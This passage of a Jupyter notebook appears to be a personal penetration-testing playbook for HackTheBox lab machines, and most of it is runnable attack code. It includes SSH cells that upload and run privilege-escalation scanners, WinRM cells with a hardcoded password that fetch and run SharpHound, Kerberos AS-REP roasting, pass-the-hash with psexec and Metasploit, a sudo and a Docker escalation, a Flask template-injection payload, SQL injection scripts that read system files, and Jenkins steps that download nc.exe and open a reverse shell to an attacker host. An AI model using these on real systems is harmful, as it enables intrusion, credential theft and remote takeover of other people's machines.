   "source": [
    "outputLocationArchive = boxDir + \"/journal_archive.txt\"\n",
    "!touch $outputLocationArchive\n",
    "!cat $outputLocationArchive $outputLocationJournal > $outputLocationArchive\n",
    "!rm $outputLocationJournal"
   ]
  },
  {
   "cell_type": "markdown",
   "metadata": {},
   "source": [
    "<a id=\"sshpcopy\"></a>\n",
    "## SSH Paramiko (Copy Files)\n",
    "\n",
    "[Back to Index](#index)"
   ]
  },
  {
   "cell_type": "code",
   "execution_count": null,
   "metadata": {},
   "outputs": [],
   "source": [
    "ssh = paramiko.SSHClient()\n",
    "ssh.set_missing_host_key_policy(paramiko.AutoAddPolicy())\n",
    "# Below is used with a password\n",
    "#ssh.connect(destIP, sshport, username, password)\n",
    "\n",
    "# Below is used with a SSH key\n",
    "# By default the key generated is OPENSSH convert to RSA by ssh-keygen -p -m PEM -f ~/.ssh/id_rsa\n",
    "ssh.connect(hostname=destIP, username=username, key_filename=sshKey)\n",
    "\n",
    "sftp=ssh.open_sftp()\n",
    "# Downloading from remotefilepath to localfilepath\n",
    "sftp.get('/etc/passwd', boxDir + \"/passwd\")\n",
    "#sftp.close()\n",
    "\n",
    "# Uploading from localfilepath to remotefilepath\n",
    "sftp.put('/var/www/html/htb/s.txt', '/home/help/s.txt')\n",
    "sftp.close()\n",
    "\n",
    "print(\"Completed the command\")"
   ]
  },
  {
   "cell_type": "markdown",
   "metadata": {},
   "source": [
    "<a id=\"sshp-peas\"></a>\n",
    "## SSH Paramiko (Execute Linpeas)\n",
    "\n",
    "[Back to Index](#index)"
   ]
  },
  {
   "cell_type": "code",
   "execution_count": null,
   "metadata": {},
   "outputs": [],
   "source": [
    "ssh = paramiko.SSHClient()\n",
    "ssh.set_missing_host_key_policy(paramiko.AutoAddPolicy())\n",
    "# Below is used with a password\n",
    "#ssh.connect(destIP, sshport, username, password)\n",
    "\n",
    "# Below is used with a SSH key\n",
    "# By default the key generated is OPENSSH convert to RSA by ssh-keygen -p -m PEM -f ~/.ssh/id_rsa\n",
    "#ssh.connect(hostname=destIP, username=username, key_filename=sshKey)\n",
    "ssh.connect(hostname=destIP, username=username, password=password, key_filename=sshKey)\n",
    "\n",
    "sftp=ssh.open_sftp()\n",
    "# Uploading from localfilepath to remotefilepath\n",
    "linpeasDir='/home/david'\n",
    "sftp.put('/var/www/html/htb/linpeas.txt', linpeasDir + '/mypeas.sh')\n",
    "\n",
    "command = 'chmod 700 ' + linpeasDir + '/mypeas.sh'\n",
    "stdin, stdout, stderr = ssh.exec_command(command)\n",
    "\n",
    "command = linpeasDir + '/mypeas.sh > ' + linpeasDir + '/mypeas.txt'\n",
    "stdin, stdout, stderr = ssh.exec_command(command)\n",
    "# Wait for the command to finish - By default paramiko will not wait\n",
    "exit_status = 1\n",
    "while exit_status != 0:\n",
    "    exit_status = stdout.channel.recv_exit_status()\n",
    "print(exit_status)\n",
    "    \n",
    "# Downloading the linpeas output\n",
    "sftp.get(linpeasDir + '/mypeas.txt', boxDir + \"/mypeas.txt\")\n",
    "\n",
    "# Remove the linpeas files\n",
    "commandList = ['rm -f ' + linpeasDir + '/mypeas.txt']\n",
    "commandList += ['rm -f ' + linpeasDir + '/mypeas.sh']\n",
    "for c in commandList:\n",
    "    stdin, stdout, stderr = ssh.exec_command(c)\n",
    "\n",
    "\n",
    "sftp.close()\n",
    "print(\"Completed the execution of Linpeas\")"
   ]
  },
  {
   "cell_type": "markdown",
   "metadata": {},
   "source": [
    "<a id=\"sshp-suggest\"></a>\n",
    "## SSH Paramiko (Linux Exploit Suggester)\n",
    "\n",
    "[Back to Index](#index)"
   ]
  },
  {
   "cell_type": "code",
   "execution_count": null,
   "metadata": {},
   "outputs": [],
   "source": [
    "ssh = paramiko.SSHClient()\n",
    "ssh.set_missing_host_key_policy(paramiko.AutoAddPolicy())\n",
    "# Below is used with a password\n",
    "#ssh.connect(destIP, sshport, username, password)\n",
    "\n",
    "# Below is used with a SSH key\n",
    "# By default the key generated is OPENSSH convert to RSA by ssh-keygen -p -m PEM -f ~/.ssh/id_rsa\n",
    "ssh.connect(hostname=destIP, username=username, key_filename=sshKey)\n",
    "\n",
    "sftp=ssh.open_sftp()\n",
    "# Uploading from localfilepath to remotefilepath\n",
    "lesDir='/home/help'\n",
    "sftp.put('/var/www/html/htb/linux-exploit-suggester.txt', lesDir + '/les.sh')\n",
    "\n",
    "command = 'chmod 700 ' + lesDir + '/les.sh'\n",
    "stdin, stdout, stderr = ssh.exec_command(command)\n",
    "\n",
    "command = lesDir + '/les.sh > ' + lesDir + '/les.txt'\n",
    "stdin, stdout, stderr = ssh.exec_command(command)\n",
    "# Wait for the command to finish - By default paramiko will not wait\n",
    "exit_status = 1\n",
    "while exit_status != 0:\n",
    "    exit_status = stdout.channel.recv_exit_status()\n",
    "print(exit_status)\n",
    "    \n",
    "# Downloading the linpeas output\n",
    "sftp.get(lesDir + '/les.txt', boxDir + \"/linux-exploit-suggester.txt\")\n",
    "\n",
    "# Remove the linpeas files\n",
    "commandList = ['rm -f ' + lesDir + '/les.txt']\n",
    "commandList += ['rm -f ' + lesDir + '/les.sh']\n",
    "for c in commandList:\n",
    "    stdin, stdout, stderr = ssh.exec_command(c)\n",
    "\n",
    "\n",
    "sftp.close()\n",
    "print(\"Completed the execution of Linux Exploit Suggester\")"
   ]
  },
  {
   "cell_type": "markdown",
   "metadata": {},
   "source": [
    "<a id=\"winrm\"></a>\n",
    "## Windows Remote Management WinRM\n",
    "\n",
    "[Back to Index](#index)"
   ]
  },
  {
   "cell_type": "code",
   "execution_count": null,
   "metadata": {},
   "outputs": [],
   "source": [
    "# Settings \n",
    "winrmusername = \"fsmith\"\n",
    "winrmpassword = \"Thestrokes23\"\n",
    "\n",
    "#poshCommand = \"Get-Location\"\n",
    "#poshCommand = \"whoami; whoami /groups; whoami /priv\"\n",
    "\n",
    "# Download a file\n",
    "# Sharphound Locations: https://github.com/BloodHoundAD/BloodHound/tree/master/Collectors\n",
    "\n",
    "# Takes a while for the command to complete based on the size of the file\n",
    "poshCommand = \"Invoke-WebRequest -Uri http://10.10.14.10:8090/SharpHound.ps1 -Outfile SharpHound.ps1\"\n",
    "# Step 2 of Sharphound\n",
    "poshCommand2 = \"Import-Module .\\SharpHound.ps1\"\n",
    "# Step 3 of Sharphound\n",
    "poshCommand3 = \"Invoke-BloodHound -CollectionMethod All\"\n",
    "# Step 4 is to Copy the file from a remote session...\n",
    "#Copy-Item -Path c:\\users\\svc-alfresco\\Documents\\20201030201503_BloodHound.zip -Destination . -FromSession $s\n",
    "\n",
    "# Gather users flag on hackthebox\n",
    "#poshCommand = \"Get-Content -Path c:\\\\users\\\\\" + winrmusername + \"\\\\Desktop\\\\user.txt\"\n",
    "\n",
    "scriptPath = boxDir + \"/ps.ps1\"\n",
    "f = open(scriptPath, \"w\")\n",
    "f.write(\"#!/usr/bin/pwsh\\n\")\n",
    "f.write(\"$pw = Convertto-Securestring -AsPlainText -Force -String \\\"\" + winrmpassword + \"\\\"\\n\")\n",
    "f.write(\"$cred = new-object -typename System.Management.Automation.PSCredential -argumentlist \\\"\" + winrmusername + \"\\\",$pw\" + \"\\n\")\n",
    "f.write(\"$s = New-PSSession -Computername \" + destIP + \" -Authentication Negotiate -Credential $cred\\n\")\n",
    "# Enterpssession $s is a manual way\n",
    "f.write(\"Invoke-Command -Session $s {\" + poshCommand + \"}\\n\")\n",
    "f.write(\"Invoke-Command -Session $s {\" + poshCommand2 + \"}\\n\")\n",
    "f.write(\"Invoke-Command -Session $s {\" + poshCommand3 + \"}\\n\")\n",
    "f.close()\n",
    "\n",
    "!chmod 700 $scriptPath\n",
    "!$scriptPath\n",
    "\n",
    "print(\"Completed Commands!\")\n",
    "\n",
    "## User powershell to write logs to event viewer: https://docs.microsoft.com/en-us/powershell/module/microsoft.powershell.management/write-eventlog?view=powershell-5.1\n"
   ]
  },
  {
   "cell_type": "markdown",
   "metadata": {},
   "source": [
    "<a id=\"rpcinfo\"></a>\n",
    "## rpcinfo and showmount for NFS shares\n",
    "\n",
    "[Back to Index](#index)\n",
    "\n",
    "````\n",
    "rpcinfo -p --ipaddr--\n",
    "showmount -e --ipaddr--\n",
    "mount --ipaddr--:--directoryshared-- /mountpoint\n",
    "````"
   ]
  },
  {
   "cell_type": "markdown",
   "metadata": {},
   "source": [
    "<a id=\"ldapsearch\"></a>\n",
    "## ldapsearch\n",
    "\n",
    "[Back to Index](#index)\n",
    "\n",
    "ldapsearch -h 10.10.10.161 -p 389 -x -b \"dc=htb,dc=local\"\n",
    "\n",
    "** This is only allowed if you do not have to authenticate to the domain\n",
    "\n",
    "?? What do you do when you have to authenticate to the domain? How does the command change?"
   ]
  },
  {
   "cell_type": "code",
   "execution_count": null,
   "metadata": {},
   "outputs": [],
   "source": [
    "outputLocationLDAP = boxDir + \"/ldapsearch.txt\"\n",
    "domain=\"dc=egotistical-bank,dc=local\"\n",
    "!ldapsearch -h $destIP -p 389 -x -b $domain > $outputLocationLDAP\n",
    "!cat $outputLocationLDAP"
   ]
  },
  {
   "cell_type": "markdown",
   "metadata": {},
   "source": [
    "### Generate List of Sam Accounts\n",
    "Parse the LDAP Information for a list of Sam Accounts\n",
    "\n",
    "Modify after the output occurs to remove unnecessary groups, etc.\n",
    "\n",
    "Note: This may not return some accounts like service accounts In hackthebox the machine Forest, it does not return svc-alfresco."
   ]
  },
  {
   "cell_type": "code",
   "execution_count": null,
   "metadata": {},
   "outputs": [],
   "source": [
    "outputLDAPUserList= boxDir + \"/userLDAP.txt\"\n",
    "!cat $outputLocationLDAP | grep -e sAMAccountName > $outputLDAPUserList\n",
    "!sed -i 's/sAMAccountName:\\s//' $outputLDAPUserList"
   ]
  },
  {
   "cell_type": "markdown",
   "metadata": {},
   "source": [
    "<a id=\"ltrace\"></a>\n",
    "## ltrace\n",
    "\n",
    "[Back to Index](#index)\n",
    "\n",
    "Use ltrace to view a verbose of the execution of a file (be careful of the execution of malware)\n",
    "````\n",
    "./ltrace --file--\n",
    "````"
   ]
  },
  {
   "cell_type": "markdown",
   "metadata": {},
   "source": [
    "<a id=\"getnpusers\"></a>\n",
    "## Impacket - GetNPUsers\n",
    "\n",
    "[Back to Index](#index)\n",
    "\n",
    "If Kerberos Pre-Authentication is Disabled a hash will be returned.  A user account list can be passed to check this...\n",
    "\n",
    "Here is some powershell to check if you have privileges: \n",
    "````\n",
    "get-aduser -filter * -properties DoesNotRequirePreAuth | where {$._DoesNotRequirePreAuth -eq \"True\" -and $_.Enabled -eq \"True\"} | select Name\n",
    "````\n",
    "\n",
    "The location of impacket may vary!"
   ]
  },
  {
   "cell_type": "code",
   "execution_count": null,
   "metadata": {
    "scrolled": true
   },
   "outputs": [],
   "source": [
    "!locate GetNPUsers"
   ]
  },
  {
   "cell_type": "code",
   "execution_count": null,
   "metadata": {},
   "outputs": [],
   "source": [
    "# Install impacket if this is the first time running GetNPUsers\n",
    "!pip install impacket\n",
    "\n",
    "# pyasn1 may not be installed also\n",
    "!pip install pyasn1"
   ]
  },
  {
   "cell_type": "markdown",
   "metadata": {},
   "source": [
    "#### Location of GetNPUsers\n",
    "Set the location of the script below\n",
    "\n",
    "##### You need to generate a users.txt file to use in the enumeration"
   ]
  },
  {
   "cell_type": "code",
   "execution_count": null,
   "metadata": {
    "scrolled": true
   },
   "outputs": [],
   "source": [
    "locationGetNPUsers=\"/usr/share/doc/python3-impacket/examples/GetNPUsers.py\"\n",
    "outputUsersTXT= boxDir + \"/users.txt\"\n",
    "# Make sure the domain is updated in the global settings\n",
    "domain = dnsName + \"/\"\n",
    "# After creating users.txt file - verify it exists\n",
    "!cat $outputUsersTXT"
   ]
  },
  {
   "cell_type": "code",
   "execution_count": null,
   "metadata": {
    "scrolled": false
   },
   "outputs": [],
   "source": [
    "locationNPUsers= boxDir + \"/npusers.txt\"\n",
    "# Modified the below command to use python3\n",
    "!python3 $locationGetNPUsers -dc-ip $destIP $domain -usersfile $outputUsersTXT -format john > $locationNPUsers\n",
    "!cat $locationNPUsers"
   ]
  },
  {
   "cell_type": "markdown",
   "metadata": {},
   "source": [
    "<a id=\"getadusers\"></a>\n",
    "## Impacket - GetADUsers\n",
    "\n",
    "[Back to Index](#index)"
   ]
  },
  {
   "cell_type": "code",
   "execution_count": null,
   "metadata": {},
   "outputs": [],
   "source": [
    "locationGetADUsers=\"/usr/share/doc/python3-impacket/examples/GetADUsers.py\"\n",
    "saveADUsers= boxDir + \"/ADusers.txt\"\n",
    "domain = dnsName + \"/\"\n",
    "!python3 $locationGetADUsers $domain -dc-ip $destIP\n",
    "\n",
    "\n",
    "# psexec - pass the hash\n",
    "# psexec.py egotistical-bank/administrator@10.10.10.175 -hashes aad3b435b51404eeaad3b435b51404ee:d9485863c1e9e05851aa40cbb4ab9dff\n"
   ]
  },
  {
   "cell_type": "markdown",
   "metadata": {},
   "source": [
    "<a id=\"findsuid\"></a>\n",
    "## Enumerate SUID Binaries\n",
    "\n",
    "[Back to Index](#index)\n",
    "\n",
    "find / -type f -perm -4000 2>/dev/null"
   ]
  },
  {
   "cell_type": "markdown",
   "metadata": {},
   "source": [
    "<a id=\"linuxprivesc\"></a>\n",
    "## Linux privesc\n",
    "\n",
    "[Back to Index](#index)\n",
    "\n",
    "LinEnum - https://github.com/rebootuser/LinEnum\n",
    "\n",
    "LinPeas - https://github.com/carlospolop/privilege-escalation-awesome-scripts-suite/blob/master/linPEAS/linpeas.sh\n",
    "\n",
    "Linux Exploit Suggester - https://github.com/mzet-/linux-exploit-suggester\n",
    "\n",
    "\n",
    "#### sudo\n",
    "\n",
    "Check on sudo -l for programs that can be executed with those permissions\n",
    "\n",
    "\n",
    "#### sudo -V if version 1.8.25p1\n",
    "CVE-2019-14287 sudo -u#-1 /bin/bash\n",
    "\n",
    "\n",
    "#### docker mount host root filesystem to image to escalate to see root files\n",
    "Reference: https://chr0x6eos.github.io/2020/10/10/htb-Cache.html   \n",
    "docker run -v /:/mnt/rootfs -it ubuntu"
   ]
  },
  {
   "cell_type": "markdown",
   "metadata": {},
   "source": [
    "<a id=\"windowsprivesc\"></a>\n",
    "## Windows privesc\n",
    "\n",
    "[Back to Index](#index)\n",
    "\n",
    "Windows Exploit Suggester\n",
    "````\n",
    "https://github.com/AonCyberLabs/Windows-Exploit-Suggester\n",
    "Download to your pentest box\n",
    "# Download from Microsoft a list of the updates to check against\n",
    "./windows-exploit-suggester.py --update\n",
    "Downloaded the following file: 2020-12-02-mssb.xls\n",
    "On the windows computer execute systeminfo and copy into systeminfo.txt on pentest box\n",
    "# Upgrade xlrd to read the xls file\n",
    "pip install xlrd --upgrade\n",
    "./windows-exploit-suggester.py --database 2020-12-02-mssb.xls --systeminfo systeminfo.txt\n",
    "````\n",
    "\n",
    "References: https://github.com/egre55/windows-kernel-exploits"
   ]
  },
  {
   "cell_type": "code",
   "execution_count": null,
   "metadata": {},
   "outputs": [],
   "source": [
    "# Download Windows-Exploit-Suggester Updated\n"
   ]
  },
  {
   "cell_type": "markdown",
   "metadata": {},
   "source": [
    "<a id=\"flaskdebug\"></a>\n",
    "## Flask Debug Console\n",
    "\n",
    "[Back to Index](#index)\n",
    "\n",
    "````\n",
    "import subprocess\n",
    "p = subprocess.check_output('whoami', shell=True)\n",
    "print(p.decode('utf-8'))\n",
    "````"
   ]
  },
  {
   "cell_type": "markdown",
   "metadata": {},
   "source": [
    "<a id=\"flasktemplate\"></a>\n",
    "## Flask Template Injection (SSTI)\n",
    "\n",
    "[Back to Index](#index)\n",
    "\n",
    "References: https://medium.com/@nyomanpradipta120/ssti-in-flask-jinja2-20b068fdaeee"
   ]
  },
  {
   "cell_type": "code",
   "execution_count": null,
   "metadata": {},
   "outputs": [],
   "source": [
    "# http://url/{{7 * 7}}  - Example test\n",
    "# {{ config.items() }} - Look at the configuration\n",
    "# {{ ''.__class__.__mro__ }} - Method resolution order\n",
    "# 414 is the location of the subprocess.Popen function\n",
    "# {{''.__class__.__mro__[1].__subclasses__()[414]('ls -lha',shell=True,stdout=-1).communicate()}}"
   ]
  },
  {
   "cell_type": "markdown",
   "metadata": {},
   "source": [
    "<a id=\"jenkins\"></a>\n",
    "## Jenkins Console\n",
    "\n",
    "[Back to Index](#index)\n",
    "\n",
    "````\n",
    "Try and find the scripts console http://:5000/<page>/script\n",
    "\n",
    "In the console you can execute commands with the following...\n",
    "\n",
    "def sout = new StringBuffer(), serr = new StringBuffer()\n",
    "def proc = 'cmd.exe /c dir'.execute()\n",
    "proc.consumeProcessOutput(sout, serr)\n",
    "proc.waitForOrKill(1000)\n",
    "println \"out> $sout err> $serr\"\n",
    "````\n",
    "\n",
    "Reference: https://www.pentestgeek.com/penetration-testing/hacking-jenkins-servers-with-no-password\n",
    "\n",
    "For powershell download a file locally to execute\n",
    "````\n",
    "def sout = new StringBuffer(), serr = new StringBuffer()\n",
    "def proc = 'cmd.exe /c echo $wc=New-Object System.Net.WebClient;$url=\"http://10.10.14.18:8090/nc.exe\";$file=\"o.exe\";$wc.DownloadFile($url,$file) > s.ps1'.execute()\n",
    "proc.consumeProcessOutput(sout, serr)\n",
    "proc.waitForOrKill(1000)\n",
    "println \"out> $sout err> $serr\"\n",
    "\n",
    "````\n",
    "\n",
    "Verify the file written\n",
    "````\n",
    "def sout = new StringBuffer(), serr = new StringBuffer()\n",
    "def proc = 'cmd.exe /c type s.ps1'.execute()\n",
    "proc.consumeProcessOutput(sout, serr)\n",
    "proc.waitForOrKill(1000)\n",
    "println \"out> $sout err> $serr\"\n",
    "````\n",
    "\n",
    "Execute the powershell file to download the nc.exe rename to o.exe\n",
    "````\n",
    "def sout = new StringBuffer(), serr = new StringBuffer()\n",
    "def proc = 'cmd.exe /c powershell -ExecutionPolicy Bypass -NoLogo -NonInteractive -NoProfile -File s.ps1'.execute()\n",
    "proc.consumeProcessOutput(sout, serr)\n",
    "proc.waitForOrKill(1000)\n",
    "println \"out> $sout err> $serr\"\n",
    "````\n",
    "\n",
    "Execute o.exe for the reverse shell \n",
    "````\n",
    "def sout = new StringBuffer(), serr = new StringBuffer()\n",
    "def proc = 'cmd.exe /c o.exe 10.10.14.18 8090 -e cmd.exe'.execute()\n",
    "proc.consumeProcessOutput(sout, serr)\n",
    "proc.waitForOrKill(1000)\n",
    "println \"out> $sout err> $serr\"\n",
    "````"
   ]
  },
  {
   "cell_type": "markdown",
   "metadata": {},
   "source": [
    "## metasploit psexec\n",
    "\n",
    "````\n",
    "msf5 > use exploit/windows/smb/psexec\n",
    "msf5 exploit(windows/smb/psexec) > set rhost 10.10.10.63\n",
    "rhost => 10.10.10.63\n",
    "msf5 exploit(windows/smb/psexec) > set rport 445\n",
    "rport => 445\n",
    "msf5 exploit(windows/smb/psexec) > show options\n",
    "\n",
    "Module options (exploit/windows/smb/psexec):\n",
    "\n",
    "   Name                  Current Setting  Required  Description\n",
    "   ----                  ---------------  --------  -----------\n",
    "   RHOSTS                10.10.10.63      yes       The target host(s), range CIDR identifier, or hosts file with syntax 'file:<path>'\n",
    "   RPORT                 445              yes       The SMB service port (TCP)\n",
    "   SERVICE_DESCRIPTION                    no        Service description to to be used on target for pretty listing\n",
    "   SERVICE_DISPLAY_NAME                   no        The service display name\n",
    "   SERVICE_NAME                           no        The service name\n",
    "   SHARE                 ADMIN$           yes       The share to connect to, can be an admin share (ADMIN$,C$,...) or a normal read/write folder share\n",
    "   SMBDomain             .                no        The Windows domain to use for authentication\n",
    "   SMBPass                                no        The password for the specified username\n",
    "   SMBUser                                no        The username to authenticate as\n",
    "\n",
    "\n",
    "Exploit target:\n",
    "\n",
    "   Id  Name\n",
    "   --  ----\n",
    "   0   Automatic\n",
    "````\n",
    "\n",
    "msf5 exploit(windows/smb/psexec) > set smbuser administrator\n",
    "smbuser => administrator\n",
    "msf5 exploit(windows/smb/psexec) > set smbpass aad3b435b51404eeaad3b435b51404ee:e0fb1fb85756c24235ff238cbe81fe00\n",
    "smbpass => aad3b435b51404eeaad3b435b51404ee:e0fb1fb85756c24235ff238cbe81fe00\n",
    "msf5 exploit(windows/smb/psexec) > exploit\n"
   ]
  },
  {
   "cell_type": "markdown",
   "metadata": {},
   "source": [
    "<a id=\"sqlinject\"></a>\n",
    "## SQL Injection\n",
    "\n",
    "[Back to Index](#index)\n",
    "\n",
    "References: https://sqlwiki.netspi.com/attackQueries/readingAndWritingFiles/#mysql\n",
    "\n",
    "https://perspectiverisk.com/mysql-sql-injection-practical-cheat-sheet/"
   ]
  },
  {
   "cell_type": "markdown",
   "metadata": {},
   "source": [
    "#### SQL Injection with POST Variables\n",
    "````\n",
    "' or 1=1;--\n",
    "# Work on the below, does not work\n",
    "' or (SELECT (SELECT IF((SELECT @@version LIKE '%Maria%'),'1','0')))=1;-- # Check if a MariaSQL Server\n",
    "' or (SELECT (SELECT IF((SELECT @@version LIKE '%MySQL%'),'1','0')))=1;-- # Check if it is a MySQL Server\n",
    "\n",
    "SQLite\n",
    "# The SELECT statement pulls the structure of the SQLLite database\n",
    "zoo' AND 1=0 UNION SELECT 1,(SELECT group_concat(sql) FROM sqlite_master),3;--\n",
    "````"
   ]
  },
  {
   "cell_type": "code",
   "execution_count": null,
   "metadata": {},
   "outputs": [],
   "source": [
    "import requests\n",
    "\n",
    "#sqlinject = [\"' or 1=1;--\"]\n",
    "sqlinject = [\"' or (SELECT (SELECT IF((SELECT @@version LIKE '%MySQL%'),'1','0')))=1;--\"]\n",
    "\n",
    "remoteurl = \"http://\" + destIP + \"/dev/login.php\"\n",
    "for i in sqlinject:\n",
    "    print(\"Injection: \" + i)\n",
    "    postObj = {'name': 'admin', 'pass': i}\n",
    "    results = requests.post(remoteurl, data = postObj)\n",
    "    print(\"HTTP Code: \" + str(results.status_code) + \"\\n\")\n",
    "    print(results.text)\n",
    "    print(\"-------------------------------\\n\\n\")"
   ]
  },
  {
   "cell_type": "markdown",
   "metadata": {},
   "source": [
    "#### SQL Injection with GET Variables"
   ]
  },
  {
   "cell_type": "code",
   "execution_count": null,
   "metadata": {},
   "outputs": [],
   "source": [
    "## Needs some work does not work for cache\n",
    "\n",
    "import requests\n",
    "\n",
    "#sqlinject = [\"1\"]\n",
    "#sqlinject = [\"1 AND EXTRACTVALUE(0, CONCAT(0x5c, VERSION()))\"]\n",
    "# On cache it goes through the first query with the below and then stops\n",
    "sqlinject = \"1 UNION SELECT 1,2,3\"\n",
    "# Find the version of a database\n",
    "sqlinject = \"1 UNION SELECT 1,2,@@version\"\n",
    "# Find the database names that are in a database\n",
    "sqlinject = \"1 UNION SELECT 1,2, concat(schema_name) FROM information_schema.schemata\"\n",
    "# Find the table names in a database\n",
    "sqlinject = \"1 UNION SELECT 1,2, concat(TABLE_NAME) FROM information_schema.TABLES WHERE table_schema='freelancer'\"\n",
    "# Find the column names in a database\n",
    "sqlinject = \"1 UNION SELECT 1,2, concat(column_name) FROM information_schema.COLUMNS WHERE TABLE_NAME='safeadmin'\"\n",
    "sqlinject = \"1 UNION SELECT id, username, password FROM freelancer.safeadmin\"\n",
    "sqlinject = \"1 UNION SELECT 1,2,LOAD_FILE('/etc/passwd')\"\n",
    "# Tried the dumpfile also into outfile\n",
    "#sqlinject = \"1 UNION SELECT 1,2,3 INTO dumpfile '/var/www/html/mail/1.txt'\"\n",
    "# To keep the php from rendering inside of a php file you can HEX the file\n",
    "# then use like cyberchef to unhex\n",
    "sqlinject = \"1 UNION SELECT 1,2,HEX(LOAD_FILE('/var/www/html/index.php'))\"\n",
    "\n",
    "remoteurl = \"http://\" + destIP + \"/portfolio.php?id=\" + sqlinject\n",
    "\n",
    "print(\"Injection: \" + remoteurl)\n",
    "# HTB: cache you need to include the cookies recieved after trying to register in the patient portal\n",
    "#cookies = {'PHPSESSID':'6o71858gr3oeh8r277oco0um2h', 'OpenEMR':'9bfsi32c0mlj5fa1k2rqkha4vf'}\n",
    "#results = requests.get(remoteurl, params=getObj, allow_redirects=False, cookies=cookies)\n",
    "results = requests.get(remoteurl)\n",
    "print(\"HTTP Code: \" + str(results.status_code) + \"\\n\")\n",
    "print(\"-----------------------------------\\n\\n\")\n",
    "print(results.text)\n",
    "print(\"-------------------------------\\n\\n\")"
   ]
  },
  {
   "cell_type": "markdown",
   "metadata": {},
   "source": [
    "<a id=\"sqlmap\"></a>\n",
    "## sqlmap\n",
    "\n",
    "[Back to Index](#index)\n",
    "\n",
    "Reference: https://chr0x6eos.github.io/2020/10/10/htb-Cache.html\n",
    "\n",
    "\n",
    "````\n",
    "sqlmap -r --request copied from zap or burp--\n",
    "````\n",
    "\n"
   ]
  },
  {
   "cell_type": "markdown",
   "metadata": {},
   "source": [
    "<a id=\"snmpwalk\"></a>\n",
    "## snmpwalk\n",
    "\n",
    "[Back to Index](#index)\n",
    "\n",
    "````\n",
    "In the SNMP here is an IPv6 address represented in decimal form:\n",
    "iso.3.6.1.2.1.4.34.1.3.2.16.222.173.190.239.0.0.0.0.2.80.86.255.254.185.69.43 = INTEGER: 2\n",
    "\n",
    "# Could use CyberChef to convert Recipe: from decimal to hex with changing the period to a colon\n",
    "IPv6: 222.173.190.239.0.0.0.0.2.80.86.255.254.185.69.43\n",
    "After Converted to Hex: de:ad:be:ef:00:00:00:00:02:50:56:ff:fe:b9:45:2b\n",
    "Change to IPv6 Format: dead:beef:0000:0000:0250:56ff:feb9:452b\n",
    "````"
   ]
  },
  {
   "cell_type": "code",
   "execution_count": null,
   "metadata": {},
   "outputs": [],
   "source": [
    "outputLocationSNMP = boxDir + \"/snmp.txt\"\n",
    "!snmpwalk -v2c -c public $destIP > $outputLocationSNMP\n",
    "!cat $outputLocationSNMP"
   ]
  },
  {
   "cell_type": "markdown",
   "metadata": {},
   "source": []
  },
  {
   "cell_type": "markdown",
   "metadata": {},
   "source": [
    "<a id=\"jwttoken\"></a>\n",
    "## JWT Token Manipulation\n",
    "\n",
    "[Back to Index](#index)\n",
    "\n",
    "Reference: https://www.tariqhawis.com/ctf/htb-under-construction-web-challange/\n",
    "\n",
    "Created Script: https://github.com/thepcn3rd/jwtToken-CVE-2016-10555"
   ]
  },
  {
   "cell_type": "code",
   "execution_count": null,
   "metadata": {},
   "outputs": [],
   "source": []
  },
  {
   "cell_type": "code",
   "execution_count": null,
   "metadata": {},
   "outputs": [],
   "source": []
  },
  {
   "cell_type": "code",
   "execution_count": null,
   "metadata": {},
   "outputs": [],
   "source": []
  },
  {
   "cell_type": "code",
   "execution_count": null,
   "metadata": {},
   "outputs": [],
   "source": []
  },
  {
   "cell_type": "code",
   "execution_count": null,
   "metadata": {},
   "outputs": [],
   "source": []
  },
  {
   "cell_type": "code",
   "execution_count": null,
   "metadata": {},
   "outputs": [],
   "source": []
  },
  {
   "cell_type": "markdown",
   "metadata": {},
   "source": []
  }
 ],
 "metadata": {
  "kernelspec": {
   "display_name": "Python 3",
   "language": "python",
   "name": "python3"
  },
  "language_info": {
   "codemirror_mode": {
    "name": "ipython",
    "version": 3
   },
   "file_extension": ".py",
   "mimetype": "text/x-python",
   "name": "python",
   "nbconvert_exporter": "python",
   "pygments_lexer": "ipython3",
   "version": "3.8.2"
  }
 },
 "nbformat": 4,
 "nbformat_minor": 4
}
